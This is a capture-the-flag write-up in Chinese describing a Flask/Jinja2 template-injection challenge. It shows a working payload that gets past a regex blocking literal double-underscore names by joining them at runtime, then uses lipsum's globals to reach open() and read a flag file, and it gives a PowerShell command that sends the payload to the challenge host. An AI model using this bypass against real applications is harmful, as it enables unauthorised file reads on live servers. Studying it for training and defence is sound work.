# Temporary Destruction

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://23.179.17.92:5558
- 核心漏洞：Flask/Jinja2 SSTI，过滤器只拦截明文 `__dunder__`，可通过动态拼接属性名绕过，最终任意读取 `/tmp/flag.txt`

## 入口与现象

题目首页只有一个输入框，提交后服务端会把输入内容“处理”后回显出来。附件里给了完整源码，优先直接看 `app.py`：

```python
if request.method == 'POST':
    raw_input = request.form.get('user_input', '')

    if BLOCKED.search(raw_input):
        output = 'rejected.'
        is_error = True
    else:
        try:
            output = render_template_string(raw_input)
        except Exception:
            output = 'error.'
            is_error = True
```

这里最关键的是 `render_template_string(raw_input)`。用户输入被直接当成 Jinja2 模板渲染，已经是标准 SSTI。

题目做的唯一限制是：

```python
BLOCKED = re.compile(r'__\w+__')
```

也就是说，只要输入里出现明文形态的 `__class__`、`__globals__`、`__builtins__` 这类双下划线属性，就会被拦掉。

先用最小 payload 验证模板执行：

```text
{{7*7}}
```

页面返回 `49`，说明 SSTI 可以稳定触发。

## 分析过程

这题的难点不在找漏洞，而在绕过这个很弱的正则过滤。

过滤器检查的是原始输入文本里是否出现 `__\w+__`，所以只要不把双下划线属性名直接写出来，而是在模板运行时再动态拼接，就不会命中过滤规则。例如：

```jinja2
['_','_','globals','_','_']|join
```

这段表达式最终会得到字符串 `__globals__`，但原始输入里并没有连续的 `__globals__` 字样，因此可以通过正则检查。

接下来要找一个可用的对象作为跳板。Jinja2 模板里默认存在 `lipsum` 这个函数对象，它带有 `__globals__`，所以可以一路取到内建对象，再直接调用 `open()` 读文件：

```jinja2
{{ lipsum
  |attr(['_','_','globals','_','_']|join)
  |attr('get')(['_','_','builtins','_','_']|join)
  |attr('get')('open')('/tmp/flag.txt')
  |attr('read')()
}}
```

这条链的思路是：

1. 用 `lipsum.__globals__` 拿到函数全局字典。
2. 从里面取出 `__builtins__`。
3. 再取出 `open`。
4. 直接读取 `/tmp/flag.txt`。

附件里的 `Dockerfile` 也证实了 flag 路径：

```dockerfile
RUN echo -n "CIT{test_flag}" > /tmp/flag.txt && \
    chmod 444 /tmp/flag.txt
```

因此不需要再走 `os.popen` 或命令执行，任意文件读就已经足够拿 flag。

## 利用过程

1. 打开首页，确认页面会把提交结果回显到下方。
2. 结合附件源码，发现后端直接执行 `render_template_string(raw_input)`，确定是 Jinja2 SSTI。
3. 用 `{{7*7}}` 验证模板表达式会被执行。
4. 发现服务端只过滤明文 `__\w+__`，于是把危险属性名改成 `['_','_','globals','_','_']|join` 这种运行时拼接形式。
5. 通过 `lipsum -> __globals__ -> __builtins__ -> open('/tmp/flag.txt').read()` 直接读取 flag 文件。

线上返回结果如下：

```text
CIT{55T1_R3m0t3_C0d3_3x3cut1on}
```

## 关键 payload / 命令

```powershell
$body = @{
  user_input = "{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')('open')('/tmp/flag.txt')|attr('read')() }}"
}

Invoke-WebRequest -UseBasicParsing 'http://23.179.17.92:5558/' -Method POST -Body $body
```

核心 payload 单独拎出来就是：

```jinja2
{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')('open')('/tmp/flag.txt')|attr('read')() }}
```

## Flag

```text
CIT{55T1_R3m0t3_C0d3_3x3cut1on}
```

## 总结

这题本质上是一个非常直接的 Jinja2 SSTI，只是额外套了一层“禁止出现明文双下划线属性”的伪过滤。真正的突破点在于意识到过滤发生在模板渲染前，所以可以把 `__globals__`、`__builtins__` 这类敏感属性改成运行时动态拼接，最终从模板上下文一路拿到 `open()`，直接把 `/tmp/flag.txt` 读出来。
